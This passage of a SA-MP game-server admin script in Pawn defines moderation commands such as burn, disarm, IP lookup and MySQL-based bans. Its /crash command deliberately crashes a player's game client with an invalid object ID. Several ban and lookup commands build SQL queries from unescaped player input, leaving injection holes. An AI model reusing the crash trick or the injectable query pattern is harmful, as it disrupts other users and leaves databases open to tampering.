				SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i,false,false);
			}
			CMDMessageToAdmins(playerid,"UNLOCKCAR");
			PlayerInfo[playerid][DoorsLocked] = 0;
			new string[128]; format(string,sizeof(string),"Administrator \"%s\" has unlocked his car", pName(playerid));
			return SendClientMessageToAll(blue,string);
		} else return SendClientMessage(playerid,red,"JikyBot: You need to be in a vehicle to lock the doors");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:burn(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/burn [playerid]");
		new player1 = strval(params), string[128], Float:x, Float:y, Float:z;
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"BURN");
			format(string, sizeof(string), "You have burnt \"%s\" ", pName(player1)); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has burnt you", pName(playerid)); SendClientMessage(player1,blue,string); }
			GetPlayerPos(player1, x, y, z);
			return CreateExplosion(x, y , z + 3, 1, 10);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:spawn(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/spawn [playerid]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SPAWN");
			format(string, sizeof(string), "You have spawned \"%s\" ", pName(player1)); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has spawned you", pName(playerid)); SendClientMessage(player1,blue,string); }
			SetPlayerPos(player1, 0.0, 0.0, 0.0);
			return SpawnPlayer(player1);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:disarm(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/disarm [playerid]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"DISARM");  PlayerPlaySound(player1,1057,0.0,0.0,0.0);
			format(string, sizeof(string), "You have disarmed \"%s\" ", pName(player1)); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has disarmed you", pName(playerid)); SendClientMessage(player1,blue,string); }
			ResetPlayerWeapons(player1);
			return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:d(playerid,params[]) {
	 return cmd_disarm(playerid, params);
}
//-----------------------------------------Commands-----------------------------
CMD:crash(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 8) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/crash [playerid]");
		new player1 = strval(params), string[128], Float:X,Float:Y,Float:Z;
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
   			CMDMessageToAdmins(playerid,"CRASH");
	        GetPlayerPos(player1,X,Y,Z);
	   		new objectcrash = CreatePlayerObject(player1,11111111,X,Y,Z,0,0,0);
			DestroyObject(objectcrash);
			format(string, sizeof(string), "You have crashed \"%s's\" game", pName(player1) );
			return SendClientMessage(playerid,blue, string);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:ip(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/ip [playerid]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"IP");
			new tmp3[50]; GetPlayerIp(player1,tmp3,50);
			format(string,sizeof(string),"\"%s's\" ip is '%s'", pName(player1), tmp3);
			return SendClientMessage(playerid,blue,string);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:rangecheck(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
		new found, string[128], ip[50], playername[MAX_PLAYER_NAME];
		if(sscanf(params,"s[50]",ip)) return SendClientMessage(playerid,RED,"Correct JikyBot: Usage:/rangecheck [ip]");
		CMDMessageToAdmins(playerid,"RANGECHECK");
		format(string,sizeof(string),"Ip checked for: \"%s\" ",params);
		SendClientMessage(playerid,blue,string);
		foreach(Player, i)
		{
			if(IsPlayerConnected(i))
			{
		    	GetPlayerIp(i, ip, 50);
				GetPlayerName(i, playername, sizeof(playername));
				new namelen = strlen(ip);
				new bool:searched=false;
				for(new pos=0; pos <= namelen; pos++)
				{
				    if(searched != true)
					{
                          if(strfind(ip,params,true) == pos)
					      {
								found++;
								format(string,sizeof(string),"%d. %s - %s(ID %d)",found,ip, playername, i);
								SendClientMessage(playerid, lightblue ,string);
								searched = true;
	                      }
					}
				}
			}
		}
		if(found == 0) SendClientMessage(playerid, blue, "No players have this ip");
	}
	else return SendClientMessage(playerid, RED,"JikyBot: You need to be level 2 to use this command!");
	return 1;
}
CMD:ipcheck(playerid,params[]) {
	 return cmd_rangecheck(playerid, params);
}
CMD:ocmds(playerid, params[])
{
SendClientMessage(playerid, -1,"operator Commands list:");
SendClientMessage(playerid, -1,"*************************");
SendClientMessage(playerid, -1,"/kick /warn /ohelp /ip");
SendClientMessage(playerid, -1,"/o [text] for operator chat!");
SendClientMessage(playerid, -1,"/ls /lsof, /afk");
SendClientMessage(playerid, -1,"******************************");
return 1;
}
/*
CMD:ban(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 5) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(!strlen(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/Ban [playerid] [reason]");
			if(!strlen(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/Ban [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);
		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
				new year,month,day,hour,minuite,second; getdate(year, month, day); gettime(hour,minuite,second);
				CMDMessageToAdmins(playerid,"BAN");
				format(string,sizeof(string),"%s has been banned by Administrator %s.",playername,adminname);
				SendClientMessageToAll(red,string);
				format(string,sizeof(string),"[Reason: %s]",params[2]);
				SendClientMessageToAll(red,string);
                SaveToFile("BanLog",string);
                for(new i = 1; i < MAX_REPORTS-1; i++) Reports[i] = Reports[i+1];
			    Bans[MAX_REPORTS-1] = string;
				print(string);
                if(udb_Exists(PlayerName2(player1)) && Logged[player1] == 1) dUserSetINT(PlayerName2(player1)).("banned",1);
				format(string,sizeof(string),"banned by Administrator %s. Reason: %s", adminname, params[2] );
				return VBanID(playerid,player1,params[2]);
			} else return SendClientMessage(playerid, red, "Player is not connected or is yourself or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}
CMD:rangeban(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 8) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(!strlen(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/Ban [playerid] [reason]");
			if(!strlen(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/Ban [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);
		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
				new year,month,day,hour,minuite,second; getdate(year, month, day); gettime(hour,minuite,second);
				CMDMessageToAdmins(playerid,"BAN");
				format(string,sizeof(string),"%s has been banned by Administrator %s.",playername,adminname);
				SendClientMessageToAll(red,string);
				format(string,sizeof(string),"[Reason: %s]",params[2]);
				SendClientMessageToAll(red,string);
                SaveToFile("BanLog",string);
                for(new i = 1; i < MAX_REPORTS-1; i++) Reports[i] = Reports[i+1];
			    Bans[MAX_REPORTS-1] = string;
				print(string);
                if(udb_Exists(PlayerName2(player1)) && Logged[player1] == 1) dUserSetINT(PlayerName2(player1)).("banned",1);
				format(string,sizeof(string),"banned by Administrator %s. Reason: %s", adminname, params[2] );
				return ABanID(playerid,player1,params[2]);
			} else return SendClientMessage(playerid, red, "Player is not connected or is yourself or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}


CMD:bannick(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
        new
			string[53],nickname[50], reason[48];
        if(sscanf(params, "s[50]s[48]", nickname, reason)) return SCM(playerid, -1, "JikyBot: Usage:/Bannick (Nickname) (Reason)");
        format(string,sizeof(string),"You have banned \"%s\" from the server. (Reason: %s)",nickname,reason);
                SaveToFile("BanLog",string);
                CMDMessageToAdmins(playerid,"BANNICK");
                format(string,sizeof(string),"/ladmin/bans/%s.sav", nickname);
				return VBanNick(playerid,nickname,reason);
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:unban(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
        new
			string[42],nickname[50];
        if(sscanf(params, "s[50]s[48]", nickname)) return SCM(playerid, -1, "JikyBot: Usage:/Unban (Nickname)");

				CMDMessageToAdmins(playerid,"UNBAN");
                SaveToFile("BanLog",string);
				return VUnBan(playerid,nickname);
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:searchban(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
        new
			string[42],nickname[50];
        if(sscanf(params, "s[50]s[48]", nickname)) return SCM(playerid, red, "JikyBot: Usage:/Searchban (Nickname)");

				CMDMessageToAdmins(playerid,"SEARCHBAN");
                format(string,sizeof(string),"/ladmin/bans/%s.ini", nickname);
				return VBanLoadInfo(playerid,string);
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}
CMD:sban(playerid,params[]) {
	return cmd_searchban(playerid, params);
}
*/
//+++++++++++++++++++++++++++++ Disable Switch By mex  +++++++++++++++

CMD:antirf(playerid, params[])
{
   new varsay[10];
   CMDMessageToAdmins(playerid,"ANTI RAPID-FIRE CONFIG");
   if(sscanf(params,"s[10]", varsay)) return SendClientMessage(playerid, 0xFFFFFFFF,"use /antirf  [0 - 1]");
   if(strfind(varsay, "0", true) != -1)
   {
   		SendClientMessage(playerid, 0xFFFF00FF, "The Anti-rapid script has been disabled!.");
     	enablearf=0;
   }
   else if(strfind(varsay, "1", true) != -1)
   {
      	SendClientMessage(playerid, 0xFFFF00FF, "The Anti-rapid script has been enabled!.");
   		enablearf=1;
   }
   return 1;
}
CMD:antiwrap(playerid, params[])
{
   new varsay[10];
   CMDMessageToAdmins(playerid,"ANTI WRAP CONFIG");
   if(sscanf(params,"s[10]", varsay)) return SendClientMessage(playerid, 0xFFFFFFFF,"use /antirf  [0 - 1]");
   if(strfind(varsay, "0", true) != -1)
   {
   		SendClientMessage(playerid, 0xFFFF00FF, "The Anti-Car_wrap script has been disabled!.");
     	enablecar=0;
   }
   else if(strfind(varsay, "1", true) != -1)
   {
      	SendClientMessage(playerid, 0xFFFF00FF, "The Anti-Car_wrap script has been enabled!.");
   		enablecar=1;
   }
   return 1;
}
CMD:anticrash(playerid, params[])
{
   new varsay[10];
   CMDMessageToAdmins(playerid,"ANTI CRASH");
   if(sscanf(params,"s[10]", varsay)) return SendClientMessage(playerid, 0xFFFFFFFF,"use /anticrash  [0 - 1]");
   if(strfind(varsay, "0", true) != -1)
   {
   		SendClientMessage(playerid, 0xFFFF00FF, "The Anti-crash script has been disabled!.");
     	enablecrash=0;
   }
   else if(strfind(varsay, "1", true) != -1)
   {
      	SendClientMessage(playerid, 0xFFFF00FF, "The Anti-crash script has been enabled!.");
   		enablecrash=1;
   }
   return 1;
}

//++++++++++++++++++++++++++++NEW BAN SYSTEM BY ABHAY +++++++++++++++++++
CMD:ban(playerid, params[])
{
  if(PlayerInfo[playerid][Level] >= 2)
  {
    new targetid, reason[100];
    if(sscanf(params,"ds[100]", targetid, reason)) return SendClientMessage(playerid, C_WHITE,"USAGE: /ban [playerid][reason]");
    if(!IsPlayerConnected(playerid) && targetid != INVALID_PLAYER_ID)
    {
      SendClientMessage(playerid, C_RED,"SERVER: Player is not connected!");
    }
    else
    {
      new playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
	  GetPlayerName(targetid, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
	  CMDMessageToAdmins(playerid,"BAN");
	  format(string,sizeof(string),"%s has been banned by Administrator %s.",playername,adminname);
//	  SendClientMessageToAll(red,string);
	  format(string,sizeof(string),"[Reason: %s]",params[2]);
//	  SendClientMessageToAll(red,string);
 	  SaveToFile("BanLog",string);
      for(new i = 1; i < MAX_REPORTS-1; i++) Reports[i] = Reports[i+1];
	  Bans[MAX_REPORTS-1] = string;
	  print(string);
      new bquery[200], IP[16];
      GetPlayerIp(targetid, IP, 16);
      format(bquery, sizeof(bquery),"INSERT INTO bandata(admin, player, reason, IP, banned) VALUES('%s', '%s', '%s','%s', 1)", PlayerName5(playerid),PlayerName5(targetid), reason, IP);
      mysql_query(bquery);
//      new string[256];
      format(string, sizeof(string),"%s has been banned by Admin %s [Reason: %s]", PlayerName5(targetid), PlayerName5(playerid), reason);
      SendClientMessageToAll(red,string);
      format(string, sizeof(string),"1,4%s has been banned by Admin %s [Reason: %s]", PlayerName5(targetid), PlayerName5(playerid), reason);
      IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
	  SendClientMessage(playerid,0xFFFF00FF,"You have been banned from the server please make a unban application at our forum");
	  SendClientMessage(playerid,0xFFFF00FF,"Forum  xenon-extreme.com");
      mysql_free_result();
      CMDMessageToAdmins(playerid,"BAN");
      SetTimerEx("DelayedKick", 1000, false, "i", targetid);
    }
  } else return SendClientMessage(playerid, C_RED,"You are not authorized to use this command!");
  return 1;
}
CMD:checkacc(playerid, params[])// search for existing bans
{
  if(PlayerInfo[playerid][Level] >= 2)
  {
    new target[50], admin[50], player[50], reason[100], IP[16];
    if(sscanf(params,"s[50]", target)) return SendClientMessage(playerid, C_RED,"USAGE: /sban [player name]");
    new query[200];
    format(query, sizeof(query),"SELECT Name,Score,Level,IP FROM `Accounts` WHERE `Name`='%s' LIMIT 1", target);
    mysql_query(query);
    mysql_store_result();
    CMDMessageToAdmins(playerid,"CHECKACC");
    new rows = mysql_num_rows();
    if(rows == 1)
    {
      while(mysql_fetch_row(query))
      {
        mysql_fetch_field_row(admin, "Name");
        mysql_fetch_field_row(player, "Score");
        mysql_fetch_field_row(IP, "IP");
        mysql_fetch_field_row(reason, "Level");
      }
      new string[128];
      format(string, sizeof(string),"Username: %s  | Score:%s | Admin Level:%s | IP:%s " , admin, player, reason, IP);
      SendClientMessage(playerid, C_RED, string);
    }
    if(!rows)
    {
      SendClientMessage(playerid, C_RED,"SERVER: No ban found on this name!");
    }
  }
  else return SendClientMessage(playerid, C_RED,"You are not authorized to use this command!");
  return 1;
}

CMD:unban(playerid, params[])
{
if(PlayerInfo[playerid][Level] >= 5)
  {
	  new target[50];
	  if(sscanf(params,"s[50]", target)) return SendClientMessage(playerid, C_RED,"USAGE: /unban [player name]");
	  new query[200];
	  format(query, sizeof(query),"SELECT * FROM `bandata` WHERE `player`='%s' AND `banned`=1 LIMIT 1", target);
	  mysql_query(query);
	  mysql_store_result();
	  new rows = mysql_num_rows();
	  if(rows == 1)
	  {
	    new uquery[200];
	    format(uquery, sizeof(uquery),"DELETE FROM `bandata` WHERE player='%s'", target);
	    mysql_query(uquery);
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"You have unbanned %s", target);
	    SendClientMessage(playerid, C_BLUE,string);
	    CMDMessageToAdmins(playerid,"UNBAN");
	  }
	  else if(!rows)
	  {
	    new str[128];
	    format(str, sizeof(str),"[ERROR]: No ban was found on this name %s", target);
	    SendClientMessage(playerid, C_RED, str);
	    mysql_free_result();
	  }
  }
else return SendClientMessage(playerid, C_RED,"You are not authorized to use this command!");
return 1;
}

CMD:sban(playerid, params[])// search for existing bans
{
  if(PlayerInfo[playerid][Level] >= 2)
  {
    new target1[50], admin[50], player[50], reason[100], IP[16];
    if(sscanf(params,"s[50]", target1)) return SendClientMessage(playerid, C_RED,"USAGE: /sban [player name]");
    new query[200];
    format(query, sizeof(query),"SELECT admin,player,reason,IP FROM `bandata` WHERE `player`='%s' AND `banned`=1 LIMIT 1", target1);
    mysql_query(query);
    mysql_store_result();
    CMDMessageToAdmins(playerid,"SBAN");
    new rows = mysql_num_rows();
    if(rows == 1)
    {
      while(mysql_fetch_row(query))
      {
        mysql_fetch_field_row(admin, "admin");
        mysql_fetch_field_row(player, "player");
        mysql_fetch_field_row(IP, "IP");
        mysql_fetch_field_row(reason, "reason");
      }
      new string[128];
      format(string, sizeof(string),"Admin: %s  | Player:%s | Reason:%s | IP:%s " , admin, player, reason, IP);
      SendClientMessage(playerid, C_RED, string);
    }
    if(!rows)
    {
      SendClientMessage(playerid, C_RED,"SERVER: No ban found on this name!");
    }
  }
  else return SendClientMessage(playerid, C_RED,"You are not authorized to use this command!");
  return 1;
}
//==========================Range Ban=======================================
CMD:rban(playerid, params[])
{
  if(PlayerInfo[playerid][Level] >= 6)
  {
    new targetid, reason[100];
    if(sscanf(params,"ds[100]", targetid, reason)) return SendClientMessage(playerid, C_WHITE,"USAGE: /ban [playerid][reason]");
    if(!IsPlayerConnected(playerid) && targetid != INVALID_PLAYER_ID)
    {
      SendClientMessage(playerid, C_RED,"SERVER: Player is not connected!");
    }
    else
    {
      new playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
	  GetPlayerName(targetid, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
	  CMDMessageToAdmins(playerid,"BAN");
	  format(string,sizeof(string),"%s has been range banned by Administrator %s.",playername,adminname);
//	  SendClientMessageToAll(red,string);
	  format(string,sizeof(string),"[Reason: %s]",params[2]);
//	  SendClientMessageToAll(red,string);
 	  SaveToFile("BanLog",string);
      for(new i = 1; i < MAX_REPORTS-1; i++) Reports[i] = Reports[i+1];
	  Bans[MAX_REPORTS-1] = string;
	  print(string);
      new bquery[200], IP[16];
      GetPlayerIp(targetid, IP, 16);
      format(bquery, sizeof(bquery),"INSERT INTO rangeban(admin, player, reason, IP, banned) VALUES('%s', '%s', '%s','%s', 1)", PlayerName5(playerid),PlayerName5(targetid), reason, IP);
      mysql_query(bquery);
//      new string[256];
      format(string, sizeof(string),"%s has been banned by Admin %s [Reason: %s]", PlayerName5(targetid), PlayerName5(playerid), reason);
      SendClientMessageToAll(red,string);
	  SendClientMessage(playerid,0xFFFF00FF,"You have been banned from the server please make a unban application at our forum");
	  SendClientMessage(playerid,0xFFFF00FF,"Forum  xenon-extreme.com");
      mysql_free_result();
      CMDMessageToAdmins(playerid,"BAN");
      SetTimerEx("DelayedKick", 1000, false, "i", targetid);
    }
  } else return SendClientMessage(playerid, C_RED,"You are not authorized to use this command!");
  return 1;
}

CMD:runban(playerid, params[])
{
if(PlayerInfo[playerid][Level] >= 6)
  {
	  new target[50];
	  if(sscanf(params,"s[50]", target)) return SendClientMessage(playerid, C_RED,"USAGE: /unban [player name]");
	  new query[200];
	  format(query, sizeof(query),"SELECT * FROM `rangeban` WHERE `player`='%s' AND `banned`=1 LIMIT 1", target);
	  mysql_query(query);
	  mysql_store_result();
	  new rows = mysql_num_rows();
	  if(rows == 1)
	  {
	    new uquery[200];
	    format(uquery, sizeof(uquery),"DELETE FROM `rangeban` WHERE player='%s'", target);
	    mysql_query(uquery);
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"You have unbanned %s", target);
	    SendClientMessage(playerid, C_BLUE,string);
	    CMDMessageToAdmins(playerid,"RUNBAN");
	    SendClientMessage(playerid, C_RED,"You can also use /RSUNBAN to search range bans");
	  }
	  else if(!rows)
	  {
	    new str[128];
	    format(str, sizeof(str),"[ERROR]: No ban was found on this name %s", target);
	    SendClientMessage(playerid, C_RED, str);
	    SendClientMessage(playerid, C_RED,"You can also use /RSUNBAN to search range bans");
	    mysql_free_result();
	  }
  }
else return SendClientMessage(playerid, C_RED,"You are not authorized to use this command!");
return 1;
}

CMD:rsban(playerid, params[])// search for existing bans
{
  if(PlayerInfo[playerid][Level] >= 2)
  {
    new target[50], admin[50], player[50], reason[100], IP[16];
    if(sscanf(params,"s[50]", target)) return SendClientMessage(playerid, C_RED,"USAGE: /sban [player name]");
    new query[200];
    format(query, sizeof(query),"SELECT admin,player,reason,IP FROM `rangeban` WHERE `player`='%s' AND `banned`=1 LIMIT 1", target);
    mysql_query(query);
    mysql_store_result();
    CMDMessageToAdmins(playerid,"RSBAN");
    new rows = mysql_num_rows();
    if(rows == 1)
    {
      while(mysql_fetch_row(query))
      {
        mysql_fetch_field_row(admin, "admin");
        mysql_fetch_field_row(player, "player");
        mysql_fetch_field_row(IP, "IP");
        mysql_fetch_field_row(reason, "reason");
      }
      new string[128];
      format(string, sizeof(string),"Admin: %s  | Player:%s | Reason:%s | IP:%s " , admin, player, reason, IP);
      SendClientMessage(playerid, C_RED, string);
    }
    if(!rows)
    {
      SendClientMessage(playerid, C_RED,"SERVER: No ban found on this name!");
    }
  }
  else return SendClientMessage(playerid, C_RED,"You are not authorized to use this command!");
  return 1;
}


CMD:sfile(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2) {
        new string[42],nickname[50];
        if(sscanf(params, "s[50]s[48]", nickname)) return SCM(playerid, red, "JikyBot: Usage:/Sfile (Nickname)");
				CMDMessageToAdmins(playerid,"SFILE");
                format(string,sizeof(string),"/ladmin/users/%s.sav", nickname);
				return VStats(playerid,string);
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:gmx(playerid, params[])
{
        if(PlayerInfo[playerid][Level] >= 8) {
        SCM(playerid,-1,"Server has been successfully restarted.");
        return SendRconCommand("gmx");
        } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:rconunban(playerid, params[])
{

        if(PlayerInfo[playerid][Level] >= 8) {
        new
            ip[48],string[64],String[27];
        if(sscanf(params, "s[48]",ip)) return SendClientMessage(playerid, red, "JikyBot: Usage:/rconunban [ip]");
		format(string,sizeof(string),"unbanip %s",ip);
		SendRconCommand(string);
		SendRconCommand("reloadbans");
        format(String, sizeof(String),"You Have Unbanned IP: %s", ip);
        SendClientMessage(playerid, -1, String);
        return 1;
        } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:rconban(playerid, params[])
{

        if(PlayerInfo[playerid][Level] >= 8) {
        new
            ip[48],string[64],String[27];
        if(sscanf(params, "s[48]",ip)) return SendClientMessage(playerid, red, "JikyBot: Usage:/rconban [ip]");
		format(string,sizeof(string),"banip %s",ip);
		SendRconCommand(string);
		SendRconCommand("reloadbans");
        format(String, sizeof(String),"You Have banned IP: %s", ip);
        SendClientMessage(playerid, -1, String);
        return 1;
        } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}


CMD:sbankrupt(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/sbankrupt [playerid]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"BANKRUPT");
			format(string, sizeof(string), "You have silently reset \"%s's\" cash", pName(player1)); SendClientMessage(playerid,blue,string);
   			return ResetPlayerMoney(player1);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:time(playerid,params[]) {
	#pragma unused params
	new string[64], hour,minuite,second; gettime(hour,minuite,second);
	format(string, sizeof(string), "~g~|~w~%d:%d~g~|", hour, minuite);
	return GameTextForPlayer(playerid, string, 5000, 1);
}

CMD:ubound(playerid,params[]) {
 	if(PlayerInfo[playerid][Level] >= 3) {
		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/ubound [playerid]");
	    new string[128], player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"UBOUND");
			SetPlayerWorldBounds(player1, 9999.9, -9999.9, 9999.9, -9999.9 );
			format(string, sizeof(string), "Administrator %s has removed your world boundaries", PlayerName2(playerid)); if(player1 != playerid) SendClientMessage(player1,blue,string);
			format(string,sizeof(string),"You have removed %s's world boundaries", PlayerName2(player1));
			return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:lhelp(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][LoggedIn] && PlayerInfo[playerid][Level] >= 1) {
		SendClientMessage(playerid,blue,"--== [ LAdmin Help ] ==--");
		SendClientMessage(playerid,blue, "For admin commands type:  /lcommands   |   Credits: /lcredits");
		SendClientMessage(playerid,blue, "Account commands are: /register, /login, /changepass, /stats, /resetstats.  Also  /time, /report");
		SendClientMessage(playerid,blue, "There are 5 levels. Level 5 admins are immune from commands");
		SendClientMessage(playerid,blue, "IMPORTANT: The filterscript must be reloaded if you change gamemodes");
		}
	else if(PlayerInfo[playerid][LoggedIn] && PlayerInfo[playerid][Level] < 1) {
	 	SendClientMessage(playerid,green, "Your commands are: /register, /login, /report, /stats, /time, /changepass, /resetstats, /getid");
 	}
	else if(PlayerInfo[playerid][LoggedIn] == 0) {
 	SendClientMessage(playerid,green, "Your commands are: /time, /getid     (You are not logged in, log in for more commands)");
	} return 1;
}

CMD:lcmds(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] > 0)
	{
		SendClientMessage(playerid,blue,"    ---= [ Most Useful Admin Commands ] ==---");
		SendClientMessage(playerid,lightblue,"GENERAL: getinfo, lmenu, announce, write, miniguns, richlist, lspec(off), move, lweaps, adminarea, giveweapon");
